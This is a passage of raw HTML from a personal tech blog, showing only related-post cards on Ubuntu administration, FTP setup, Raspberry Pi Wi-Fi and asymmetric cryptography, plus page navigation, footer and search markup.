<span id=likes_posts/Ubuntu-Move-Home-To-New-Disk/index.md class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title=likes>loading</span>
<span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M47.6 300.4 228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6.0 115.2.0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg></span></span></span></div><div class="flex flex-row flex-wrap items-center"></div><div class="flex flex-row flex-wrap items-center"><span style=margin-top:.5rem class=mr-2 onclick='window.open("/categories/computer-science/","_self")'><span class=flex style=cursor:pointer><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Computer-Science
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='window.open("/tags/ubuntu/","_self")'><span class=flex style=cursor:pointer><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Ubuntu
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='window.open("/tags/disk/","_self")'><span class=flex style=cursor:pointer><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Disk</span></span></span></div></div><div class="py-1 prose dark:prose-invert"><p>如果發現當初掛載好的空間不夠用了，那麼擴充硬碟上去，然後照著步驟一步步的將檔案們搬家吧。</p></div></div><div class="px-6 pt-4 pb-2"></div></div></a><a href=/posts/ubuntu-pppoe-connection/ class=min-w-full><div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative"><div class="w-full thumbnail_card_related nozoom" style=background-image:url(/posts/ubuntu-pppoe-connection/cover_hu65ae5899d08f287b23a21fea9b3476b8_2996862_600x0_resize_q75_box.jpg)></div><div class="px-6 py-4"><div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral" href=/posts/ubuntu-pppoe-connection/>How to use PPPoE to connect network on Ubuntu?</div><div class="text-sm text-neutral-500 dark:text-neutral-400"><div class="flex flex-row flex-wrap items-center"><time datetime="2022-01-21 16:55:18 +0000 UTC">2022/01/21</time><span class="px-2 text-primary-500">&#183;</span><span>353 字</span><span class="px-2 text-primary-500">&#183;</span><span>
<span id=views_posts/Ubuntu-PPPoE-Connection/index.md class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title=views>loading</span>
<span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentcolor" d="M288 32c-80.8.0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7.0 24.6C17.3 304 48.6 356 95.4 399.4 142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1 3.3-7.9 3.3-16.7.0-24.6-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144 64.5-144 144-144 144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64-11.5.0-22.3-3-31.6-8.4-.2 2.8-.4 5.5-.4 8.4.0 53 43 96 96 96s96-43 96-96-43-96-96-96c-2.8.0-5.6.1-8.4.4 5.3 9.3 8.4 20.1 8.4 31.6z"/></svg>
</span></span></span><span class="px-2 text-primary-500">&#183;</span><span>
<span id=likes_posts/Ubuntu-PPPoE-Connection/index.md class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title=likes>loading</span>
<span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M47.6 300.4 228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6.0 115.2.0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg></span></span></span></div><div class="flex flex-row flex-wrap items-center"></div><div class="flex flex-row flex-wrap items-center"><span style=margin-top:.5rem class=mr-2 onclick='window.open("/categories/computer-science/","_self")'><span class=flex style=cursor:pointer><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Computer-Science
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='window.open("/tags/ubuntu/","_self")'><span class=flex style=cursor:pointer><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Ubuntu
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='window.open("/tags/pppoe/","_self")'><span class=flex style=cursor:pointer><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">PPPoE</span></span></span></div></div><div class="py-1 prose dark:prose-invert"><p>在 Ubuntu 用 PPPoE 連線中華電信固定 IP。</p></div></div><div class="px-6 pt-4 pb-2"></div></div></a><a href=/posts/ftp-server-vsftpd/ class=min-w-full><div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative"><div class="w-full thumbnail_card_related nozoom" style=background-image:url(/posts/ftp-server-vsftpd/cover_hubb7d58570a1db9d6cf59656423ed375e_70173_600x0_resize_q75_box.jpg)></div><div class="px-6 py-4"><div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral" href=/posts/ftp-server-vsftpd/>Build a FTP Server with 「vsftpd」</div><div class="text-sm text-neutral-500 dark:text-neutral-400"><div class="flex flex-row flex-wrap items-center"><time datetime="2022-01-19 21:03:36 +0000 UTC">2022/01/19</time><span class="px-2 text-primary-500">&#183;</span><span>343 字</span><span class="px-2 text-primary-500">&#183;</span><span>
<span id=views_posts/FTP-Server-vsftpd/index.md class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title=views>loading</span>
<span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentcolor" d="M288 32c-80.8.0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7.0 24.6C17.3 304 48.6 356 95.4 399.4 142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1 3.3-7.9 3.3-16.7.0-24.6-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144 64.5-144 144-144 144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64-11.5.0-22.3-3-31.6-8.4-.2 2.8-.4 5.5-.4 8.4.0 53 43 96 96 96s96-43 96-96-43-96-96-96c-2.8.0-5.6.1-8.4.4 5.3 9.3 8.4 20.1 8.4 31.6z"/></svg>
</span></span></span><span class="px-2 text-primary-500">&#183;</span><span>
<span id=likes_posts/FTP-Server-vsftpd/index.md class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title=likes>loading</span>
<span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M47.6 300.4 228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6.0 115.2.0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg></span></span></span></div><div class="flex flex-row flex-wrap items-center"></div><div class="flex flex-row flex-wrap items-center"><span style=margin-top:.5rem class=mr-2 onclick='window.open("/categories/computer-science/","_self")'><span class=flex style=cursor:pointer><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Computer-Science
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='window.open("/tags/ftp/","_self")'><span class=flex style=cursor:pointer><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">FTP</span></span></span></div></div><div class="py-1 prose dark:prose-invert"><p>How to build the FTP Server quicly with 「vsftpd」?</p></div></div><div class="px-6 pt-4 pb-2"></div></div></a><a href=/posts/raspberry-pi4-ubuntu-wifi-configure/ class=min-w-full><div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative"><div class="w-full thumbnail_card_related nozoom" style=background-image:url(/posts/raspberry-pi4-ubuntu-wifi-configure/cover_hudf67ec0a028f475ca3ee9cab32243ca9_229894_600x0_resize_q75_box.jpg)></div><div class="px-6 py-4"><div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral" href=/posts/raspberry-pi4-ubuntu-wifi-configure/>Raspberry Pi 4 (Ubuntu) configure auto connect to wifi</div><div class="text-sm text-neutral-500 dark:text-neutral-400"><div class="flex flex-row flex-wrap items-center"><time datetime="2022-01-19 15:11:57 +0000 UTC">2022/01/19</time><span class="px-2 text-primary-500">&#183;</span><span>142 字</span><span class="px-2 text-primary-500">&#183;</span><span>
<span id=views_posts/Raspberry-Pi4-Ubuntu-Wifi-Configure/index.md class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title=views>loading</span>
<span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentcolor" d="M288 32c-80.8.0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7.0 24.6C17.3 304 48.6 356 95.4 399.4 142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1 3.3-7.9 3.3-16.7.0-24.6-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144 64.5-144 144-144 144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64-11.5.0-22.3-3-31.6-8.4-.2 2.8-.4 5.5-.4 8.4.0 53 43 96 96 96s96-43 96-96-43-96-96-96c-2.8.0-5.6.1-8.4.4 5.3 9.3 8.4 20.1 8.4 31.6z"/></svg>
</span></span></span><span class="px-2 text-primary-500">&#183;</span><span>
<span id=likes_posts/Raspberry-Pi4-Ubuntu-Wifi-Configure/index.md class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title=likes>loading</span>
<span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M47.6 300.4 228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6.0 115.2.0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg></span></span></span></div><div class="flex flex-row flex-wrap items-center"></div><div class="flex flex-row flex-wrap items-center"><span style=margin-top:.5rem class=mr-2 onclick='window.open("/categories/computer-science/","_self")'><span class=flex style=cursor:pointer><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Computer-Science
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='window.open("/tags/raspberry-pi/","_self")'><span class=flex style=cursor:pointer><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Raspberry PI
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='window.open("/tags/wi-fi/","_self")'><span class=flex style=cursor:pointer><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Wi-Fi
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='window.open("/tags/ubuntu/","_self")'><span class=flex style=cursor:pointer><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Ubuntu</span></span></span></div></div><div class="py-1 prose dark:prose-invert"><p>How to make ubuntu auto connect to wifi in raspberry pi 4?</p></div></div><div class="px-6 pt-4 pb-2"></div></div></a><a href=/posts/asymmetric-cryptography/ class=min-w-full><div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative"><div class="w-full thumbnail_card_related nozoom" style=background-image:url(/posts/asymmetric-cryptography/cover_hu3d03a01dcc18bc5be0e67db3d8d209a6_2186980_600x0_resize_q75_box.jpg)></div><div class="px-6 py-4"><div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral" href=/posts/asymmetric-cryptography/>非對稱加密 (Asymmetric Cryptography)</div><div class="text-sm text-neutral-500 dark:text-neutral-400"><div class="flex flex-row flex-wrap items-center"><time datetime="2020-02-16 01:30:56 +0000 UTC">2020/02/16</time><span class="px-2 text-primary-500">&#183;</span><span>1191 字</span><span class="px-2 text-primary-500">&#183;</span><span>
<span id=views_posts/Asymmetric-Cryptography/index.md class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title=views>loading</span>
<span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentcolor" d="M288 32c-80.8.0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7.0 24.6C17.3 304 48.6 356 95.4 399.4 142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1 3.3-7.9 3.3-16.7.0-24.6-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144 64.5-144 144-144 144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64-11.5.0-22.3-3-31.6-8.4-.2 2.8-.4 5.5-.4 8.4.0 53 43 96 96 96s96-43 96-96-43-96-96-96c-2.8.0-5.6.1-8.4.4 5.3 9.3 8.4 20.1 8.4 31.6z"/></svg>
</span></span></span><span class="px-2 text-primary-500">&#183;</span><span>
<span id=likes_posts/Asymmetric-Cryptography/index.md class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title=likes>loading</span>
<span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M47.6 300.4 228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6.0 115.2.0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg></span></span></span></div><div class="flex flex-row flex-wrap items-center"></div><div class="flex flex-row flex-wrap items-center"><span style=margin-top:.5rem class=mr-2 onclick='window.open("/categories/computer-science/","_self")'><span class=flex style=cursor:pointer><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Computer-Science
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='window.open("/tags/cryptography/","_self")'><span class=flex style=cursor:pointer><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Cryptography
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='window.open("/tags/digital-signature/","_self")'><span class=flex style=cursor:pointer><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Digital Signature</span></span></span></div></div><div class="py-1 prose dark:prose-invert"><p>這次提到的概念是比上次的「 <strong>Symmetric Cryptography</strong> 」來的更進階的「 <strong>Asymmetric Cryptography (非對稱加密)</strong> 」，其概念被廣泛運用在<strong>數位簽章</strong>。</p></div></div><div class="px-6 pt-4 pb-2"></div></div></a></section></div><script>var oid="views_posts/CTF-hackme-web-Write-Up/index.md",oid_likes="likes_posts/CTF-hackme-web-Write-Up/index.md"</script><script type=text/javascript src=/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q+oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span><a class="flex group mr-3" href=/posts/mysql-8-change-root-password/><span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&larr;</span>
<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">Change root password in MySQL 8</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime="2022-01-29 16:46:05 +0000 UTC">2022/01/29</time>
</span></span></a></span><span><a class="flex text-right group ml-3" href=/posts/ubuntu-change-home-folder-language/><span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">Ubuntu 更改家目錄語言</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime="2022-07-07 13:40:42 +0000 UTC">2022/07/07</time>
</span></span><span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&larr;</span></a></span></div></div></footer></article><br><ins class=adsbygoogle style=display:block data-ad-format=fluid data-ad-layout-key=-hg-k+34-7c+7i data-ad-client=ca-pub-8417118187182876 data-ad-slot=5709143475></ins><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script><div id=top-scroller class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0"><a href=#the-top class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label=捲動到頁頂 title=捲動到頁頂>&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">版權所有 翻印必究<br>Copyright © 2019 - Now, Alpaca. All rights reserved.</p><p class="text-xs text-neutral-500 dark:text-neutral-400">以 <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a> 製作</p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]" data-url=https://blog.alpaca.tw/ style=z-index:500><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=搜尋 tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="關閉 (Esc)">
<span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>